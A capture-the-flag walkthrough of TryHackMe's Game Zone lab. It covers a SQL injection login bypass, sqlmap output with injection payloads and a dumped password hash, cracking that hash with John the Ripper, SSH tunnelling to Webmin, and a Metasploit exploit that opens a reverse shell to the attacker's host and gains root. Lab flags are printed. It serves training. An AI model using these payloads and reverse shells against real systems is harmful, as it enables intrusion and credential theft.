# Game Zone

[Game Zone](https://tryhackme.com/room/gamezone) is a CTf from TryHackMe, with a focus on using SQLMap to obtain reverse shell, and then privilege escalation.

## [Task 1] Deploy the vulnerable machine

This room will cover SQLi (exploiting this vulnerability manually and via SQLMap), cracking a users hashed password, using SSH tunnels to reveal a hidden service and using a metasploit payload to gain root privileges.

----

### 1. Deploy the machine and access its web server

Deploy the VM, then navigate to the host on port 80.

### 2. What is the name of the large cartoon avatar holding a sniper on the forum

The cartoon character on the front page is `Agent 47`. If you're not familiar with the _Hitman_ franchise, then you can always reverse image search the image through services like Google Images or TinyPic.

## [Task 2] Obtain access via SQLi

### 1. SQL is a standard language for storing, editing and retrieving data in databases. A query can look like so

```sql
SELECT * FROM users WHERE username = :username AND password := password
```

> In our GameZone machine, when you attempt to login, it will take your inputted values from your username and password, then insert them directly into the query above. If the query finds data, you'll be allowed to login otherwise it will display an error message.
>
> Here is a potential place of vulnerability, as you can input your username as another SQL query. This will take the query write, place and execute it.

Hit the completed button after understanding.

### 2. Lets use what we've learnt above, to manipulate the query and login without any legitimate credentials

> If we have our username as admin and our password as: `' or 1=1 -- -` it will insert this into the query and authenticate our session.
>
> The SQL query that now gets executed on the web server is as follows:
>
> `SELECT * FROM users WHERE username = admin AND password := ' or 1=1 -- -`
>
> The extra SQL we inputted as our password has changed the above query to break the initial query and proceed (with the admin user) `if 1==1`, then comment the rest of the query to stop it breaking.

Hit the completed button after understanding.

### 3. GameZone doesn't have an admin user in the database, however you can still login without knowing any credentials using the inputted password data we used in the previous question

> Use `' or 1=1 -- -` as your username and leave the password blank.
>
> When you've logged in, what page do you get redirected to?

After running `' or 1=1 -- -`, you're redirected to `portal.php`.

## [Task 3] Using SQLMap

We're going to use SQLMap to dump the entire database for GameZone.

>
> Using the page we logged into earlier, we're going point SQLMap to the game review search feature.
>
> First we need to intercept a request made to the search feature using BurpSuite.
>
> Save this request into a text file. We can then pass this into SQLMap to use our authenticated user session.
>
> `-r` uses the intercepted request you saved earlier
> `--dbms` tells SQLMap what type of database management system it is
> `--dump` attempts to outputs the entire database
>
> SQLMap will now try different methods and identify the one thats vulnerable. Eventually, it will output the database.
>
> In the users table, what is the hashed password?

TryHackMe goes the route of pulling a request from BurpSuite, but for the sake of efficiency, we can literally just pull the request from our Browser, and save the extra steps.

I'm using Firefox; hit `F12` on page, went to the network tab, and copied the the `POST` request's headers and params. To capture a request input and submitted some text into the search function on `portal.php`.

```text
POST /portal.php HTTP/1.1
Host: 10.10.247.64
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.247.64/portal.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
Connection: keep-alive
Cookie: PHPSESSID=osl80p6298d7a7rn6463jrnqm1
Upgrade-Insecure-Requests: 1

searchitem=test
```

Saved the above to a text file called `request.txt` and ran it against `sqlmap`.

```shell-session
kali@kali:~/Desktop/TryHackMe/game-zone$ sqlmap -r request.txt --dbms=mysql --dump
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.4.9#stable}
|_ -| . [)]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:41:41 /2020-09-16/

[14:41:41] [INFO] parsing HTTP request from 'request.txt'
[14:41:41] [INFO] testing connection to the target URL
[14:41:42] [INFO] testing if the target URL content is stable
[14:41:42] [INFO] target URL content is stable
[14:41:42] [INFO] testing if POST parameter 'searchitem' is dynamic
[14:41:42] [WARNING] POST parameter 'searchitem' does not appear to be dynamic
[14:41:42] [INFO] heuristic (basic) test shows that POST parameter 'searchitem' might be injectable (possible DBMS: 'MySQL')
[14:41:42] [INFO] heuristic (XSS) test shows that POST parameter 'searchitem' might be vulnerable to cross-site scripting (XSS) attacks
[14:41:42] [INFO] testing for SQL injection on POST parameter 'searchitem'
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n]
[14:44:15] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[14:44:15] [WARNING] reflective value(s) found and filtering out
[14:44:15] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[14:44:15] [INFO] testing 'Generic inline queries'
[14:44:15] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[14:44:17] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[14:44:17] [INFO] POST parameter 'searchitem' appears to be 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)' injectable (with --string="is")
[14:44:17] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[14:44:17] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[14:44:17] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[14:44:17] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[14:44:17] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[14:44:17] [INFO] POST parameter 'searchitem' is 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)' injectable
[14:44:17] [INFO] testing 'MySQL inline queries'
[14:44:17] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[14:44:17] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[14:44:17] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[14:44:17] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[14:44:17] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
[14:44:17] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
[14:44:17] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[14:44:27] [INFO] POST parameter 'searchitem' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
[14:44:27] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[14:44:27] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[14:44:27] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[14:44:28] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[14:44:28] [INFO] target URL appears to have 3 columns in query
[14:44:28] [INFO] POST parameter 'searchitem' is 'MySQL UNION query (NULL) - 1 to 20 columns' injectable
[14:44:28] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
POST parameter 'searchitem' is vulnerable. Do you want to keep testing the others (if any)? [y/N]
sqlmap identified the following injection point(s) with a total of 88 HTTP(s) requests:
---
Parameter: searchitem (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: searchitem=-3246' OR 1388=1388#

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: searchitem=test' AND GTID_SUBSET(CONCAT(0x7178707071,(SELECT (ELT(2016=2016,1))),0x71626a6271),2016)-- gKUk

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: searchitem=test' AND (SELECT 4241 FROM (SELECT(SLEEP(5)))OSoU)-- CBMC

    Type: UNION query
    Title: MySQL UNION query (NULL) - 3 columns
    Payload: searchitem=test' UNION ALL SELECT NULL,NULL,CONCAT(0x7178707071,0x5956417846774e72737148416d725965796468796376666c6f7876544d706b556f73546648454277,0x71626a6271)#
---
[14:44:29] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.6
[14:44:29] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[14:44:29] [INFO] fetching current database
[14:44:29] [INFO] fetching tables for database: 'db'
[14:44:29] [INFO] fetching columns for table 'post' in database 'db'
[14:44:29] [INFO] fetching entries for table 'post' in database 'db'
Database: db
Table: post
[5 entries]
+----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| id | name                           | description                                                                                                                                                                                            |
+----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| 1  | Mortal Kombat 11               | Its a rare fighting game that hits just about every note as strongly as Mortal Kombat 11 does. Everything from its methodical and deep combat.                                                         |
| 2  | Marvel Ultimate Alliance 3     | Switch owners will find plenty of content to chew through, particularly with friends, and while it may be the gaming equivalent to a Hulk Smash, that isnt to say that it isnt a rollicking good time. |
| 3  | SWBF2 2005                     | Best game ever                                                                                                                                                                                         |
| 4  | Hitman 2                       | Hitman 2 doesnt add much of note to the structure of its predecessor and thus feels more like Hitman 1.5 than a full-blown sequel. But thats not a bad thing.                                          |
| 5  | Call of Duty: Modern Warfare 2 | When you look at the total package, Call of Duty: Modern Warfare 2 is hands-down one of the best first-person shooters out there, and a truly amazing offering across any system.                      |
+----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+

[14:44:29] [INFO] table 'db.post' dumped to CSV file '/home/kali/.local/share/sqlmap/output/10.10.247.64/dump/db/post.csv'
[14:44:29] [INFO] fetching columns for table 'users' in database 'db'
[14:44:29] [INFO] fetching entries for table 'users' in database 'db'
[14:44:29] [INFO] recognized possible password hashes in column 'pwd'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N]
do you want to crack them via a dictionary-based attack? [Y/n/q]
[14:44:32] [INFO] using hash method 'sha256_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files

[14:44:40] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] n
[14:44:44] [INFO] starting dictionary-based cracking (sha256_generic_passwd)
[14:44:44] [INFO] starting 4 processes
[14:45:04] [WARNING] no clear password(s) found
Database: db
Table: users
[1 entry]
+------------------------------------------------------------------+----------+
| pwd                                                              | username |
+------------------------------------------------------------------+----------+
| ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14 | agent47  |
+------------------------------------------------------------------+----------+

[14:45:04] [INFO] table 'db.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/10.10.247.64/dump/db/users.csv'
[14:45:04] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.10.247.64'

[*] ending @ 14:45:04 /2020-09-16/

```

The above `sqlmap` scan reveals a few answers the next question. Firstly, we find the _hashed password_ from the database dump, `ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14`.

### 2. What was the username associated with the hashed password

This is also visible in the `sqlmap` dump; `agent47`.

### 3. What was the other table name

```shell-session
enumerate table(s) entries
[14:44:29] [INFO] fetching current database
[14:44:29] [INFO] fetching tables for database: 'db'
[14:44:29] [INFO] fetching columns for table 'post' in database 'db'
[14:44:29] [INFO] fetching entries for table 'post' in database 'db'
Database: db
Table: post
[5 entries]
```

The other table is `post`. Which contains a number of other games.

## [Task 4] Cracking a password with JohnTheRipper

### 1. If you are using a low-powered laptop, you can deploy a high spec'd Kali Linux machine on TryHackMe and control it in your browser

To crack the hashed password `ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14`, I ran the following:

```shell-session
kali@kali:~/Desktop/TryHackMe/game-zone$ echo 'ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14' >> hash.txt; sudo john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA256 [SHA256 256/256 AVX2 8x])
Warning: poor OpenMP scalability for this hash type, consider --fork=4
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
videogamer124    (?)
1g 0:00:00:00 DONE (2020-09-16 15:00) 1.666g/s 4915Kp/s 4915Kc/s 4915KC/s vimivi..vainlove
Use the "--show --format=Raw-SHA256" options to display all of the cracked passwords reliably
Session completed
```

Initially, `echo`ing the hashed password into a .txt file for `john` to read and crack.

### 2. What is the de-hashed password

The cracked password is revealed to be `videogamer124`.

### 3. Now you have a password and username. Try SSH'ing onto the machine

> What is the user flag?

```shell-session
kali@kali:~/Desktop/TryHackMe/game-zone$ ssh agent47@10.10.247.64
The authenticity of host '10.10.247.64 (10.10.247.64)' can't be established.
ECDSA key fingerprint is SHA256:mpNHvzp9GPoOcwmWV/TMXiGwcqLIsVXDp5DvW26MFi8.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.247.64' (ECDSA) to the list of known hosts.
agent47@10.10.247.64's password:
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

109 packages can be updated.
68 updates are security updates.


Last login: Fri Aug 16 17:52:04 2019 from 192.168.1.147
agent47@gamezone:~$ ls
user.txt
agent47@gamezone:~$ cat user.txt
649ac17b1480ac13ef1e4fa579dac95c
```

After `ssh`ing into the box, I fired `ls` and found the `user.txt` file. Then read from file with `cat user.txt` for the user flag; `649ac17b1480ac13ef1e4fa579dac95c`.

## [Task 5] Exposing services with reverse SSH tunnels

### 1. We will use a tool called ss to investigate sockets running on a host

> How many TCP sockets are running?
>
> If we run `ss -tulpn` it will tell us what socket connections are running

#### ss arguments

- `-t` Display TCP sockets
- `-u` Display UDP sockets
- `-l` Displays only listening sockets
- `-p` Shows the process using the socket
- `-n` Doesn't resolve service names

#### Running ss

Running the above command on the `ssh`'d box, we get:

```shell-session
agent47@gamezone:~$ ss -tulpn
Netid  State      Recv-Q Send-Q Local Address:Port               Peer Address:Port
udp    UNCONN     0      0        *:10000                *:*
udp    UNCONN     0      0        *:68                   *:*
tcp    LISTEN     0      80     127.0.0.1:3306                 *:*
tcp    LISTEN     0      128      *:10000                *:*
tcp    LISTEN     0      128      *:22                   *:*
tcp    LISTEN     0      128     :::80                  :::*
tcp    LISTEN     0      128     :::22                  :::*  
```

From here we can count the number of `tcp` sockets; 5.

We could also run the following to count the lines where tcp exists:

```shell-session
agent47@gamezone:~$ ss -tulpn | grep tcp | cat -n
     1  tcp    LISTEN     0      80     127.0.0.1:3306                  *:*
     2  tcp    LISTEN     0      128       *:10000                 *:*
     3  tcp    LISTEN     0      128       *:22                    *:*
     4  tcp    LISTEN     0      128      :::80                   :::*
     5  tcp    LISTEN     0      128      :::22                   :::*
```

### 2. We can see that a service running on port 10000 is blocked via a firewall rule from the outside (we can see this from the IPtable list). However, Using an SSH Tunnel we can expose the port to us (locally)

> From our local machine, run `ssh -L 10000:localhost:10000 <username>@<ip>`
>
> Once complete, in your browser type "localhost:10000" and you can acess the newly-exposed webserver.
>
> What is the name of the exposed CMS?

```shell-session
kali@kali:~$ ssh -L 10000:localhost:10000 agent47@10.10.247.64
agent47@10.10.247.64's password:
Permission denied, please try again.
agent47@10.10.247.64's password:
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

109 packages can be updated.
68 updates are security updates.


Last login: Wed Sep 16 14:03:25 2020 from 10.11.8.219
agent47@gamezone:~$
```

After creating the SSH tunnel, we should be able to navigate to `localhost:10000` on our _local machine_.

And as expected, we're returned a login page; with the CMS name `Webmin`.

### 3. What is the CMS version

There may have been some enumeration tactic that couldn't been taken here, but the trusty failure of using the same username and password across every account renders this flag fairly simple.

Upon loggin into Webmin with credentials `agent47:videogamer124`, we gain access to admin panel which displays server information as seen below:

```console
**System hostname**: gamezone (127.0.1.1)
**Operating system**: Ubuntu Linux 16.04.6
**Webmin version**: 1.580
**Time on system **: Wed Sep 16 14:19:46 2020
**Kernel and CPU **: Linux 4.4.0-159-generic on x86_64
**Processor information**: Intel(R) Xeon(R) CPU E5-2676 v3 @ 2.40GHz, 1 cores
**System uptime **: 1 hours, 13 minutes
**Running processes**: 127
**CPU load averages**: 0.00 (1 min) 0.00 (5 mins) 0.00 (15 mins)
**CPU usage**: 0% user, 0% kernel, 0% IO, 100% idle
**Real memory**: 1.95 GB total, 307.53 MB used
**Virtual memory**: 975 MB total, 0 bytes used
**Local disk space**: 8.78 GB total, 2.82 GB used
**Package updates**: All installed packages are up to date
```

The CMS version is `1.580`.

## [Task 6] Privilege Escalation with Metasploit

### 1. What is the root flag

After searching for a metasploit exploit, I eventually found one that the application _was_ vulenarable to. With a little trial and error...

```shell-session
msf5 exploit(linux/http/webmin_backdoor) > search webmin

Matching Modules
================

   #  Name                                         Disclosure Date  Rank       Check  Description
   -  ----                                         ---------------  ----       -----  -----------
   0  auxiliary/admin/webmin/edit_html_fileaccess  2012-09-06       normal     No     Webmin edit_html.cgi file Parameter Traversal Arbitrary File Access
   1  auxiliary/admin/webmin/file_disclosure       2006-06-30       normal     No     Webmin File Disclosure
   2  exploit/linux/http/webmin_backdoor           2019-08-10       excellent  Yes    Webmin password_change.cgi Backdoor
   3  exploit/linux/http/webmin_packageup_rce      2019-05-16       excellent  Yes    Webmin Package Updates Remote Command Execution
   4  exploit/unix/webapp/webmin_show_cgi_exec     2012-09-06       excellent  Yes    Webmin /file/show.cgi Remote Command Execution
   5  exploit/unix/webapp/webmin_upload_exec       2019-01-17       excellent  Yes    Webmin Upload Authenticated RCE


Interact with a module by name or index, for example use 5 or use exploit/unix/webapp/webmin_upload_exec

msf5 exploit(linux/http/webmin_backdoor) > use 4
msf5 exploit(unix/webapp/webmin_show_cgi_exec) > options

Module options (exploit/unix/webapp/webmin_show_cgi_exec):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD  videogamer124    yes       Webmin Password
   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS    localhost        yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT     10000            yes       The target port (TCP)
   SSL       false            yes       Use SSL
   USERNAME  agent47          yes       Webmin Username
   VHOST                      no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   Webmin 1.580

msf5 exploit(unix/webapp/webmin_show_cgi_exec) > set lhost 127.0.0.1
lhost => 127.0.0.1
msf5 exploit(unix/webapp/webmin_show_cgi_exec) > run

[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
[*] Started reverse TCP handler on 127.0.0.1:4444
[*] Attempting to login...
[+] Authentication successfully
[+] Authentication successfully
[*] Attempting to execute the payload...
[+] Payload executed successfully
[*] Exploit completed, but no session was created.
msf5 exploit(unix/webapp/webmin_show_cgi_exec) > set lhost tun0
lhost => 10.11.8.219
msf5 exploit(unix/webapp/webmin_show_cgi_exec) > run

[*] Started reverse TCP handler on 10.11.8.219:4444
[*] Attempting to login...
[+] Authentication successfully
[+] Authentication successfully
[*] Attempting to execute the payload...
[+] Payload executed successfully
[*] Exploit completed, but no session was created.
msf5 exploit(unix/webapp/webmin_show_cgi_exec) > options

Module options (exploit/unix/webapp/webmin_show_cgi_exec):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD  videogamer124    yes       Webmin Password
   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS    127.0.0.1        yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT     10000            yes       The target port (TCP)
   SSL       false            yes       Use SSL
   USERNAME  agent47          yes       Webmin Username
   VHOST                      no        HTTP server virtual host

Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.11.8.219      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Webmin 1.580

msf5 exploit(unix/webapp/webmin_show_cgi_exec) > set payload cmd/unix/reverse_python
payload => cmd/unix/reverse_python
msf5 exploit(unix/webapp/webmin_show_cgi_exec) > run

[*] Started reverse TCP handler on 10.11.8.219:4444
[*] Attempting to login...
[+] Authentication successfully
[+] Authentication successfully
[*] Attempting to execute the payload...
[+] Payload executed successfully
[*] Command shell session 1 opened (10.11.8.219:4444 -> 10.10.247.64:40778) at 2020-09-16 15:56:07 -0400

whoami
root
cd /root/
ls
root.txt
cat root.txt
```

And there we have it.

----

## Some learning points from this box

- You don't _have_ to use `burp`. Modern browsers are pretty powerful.
- SQLMap can _also_ crack passwords
- Don't be afraid to trial and error through multiple payloads if an `msfconsole` exploit's `check` function say's a target is vulnerable, but at first doesn't work.
- SSH tunnelling allows you to map ports inaccessible to the local machine through the `-L PORT:localhost:PORT` flag.
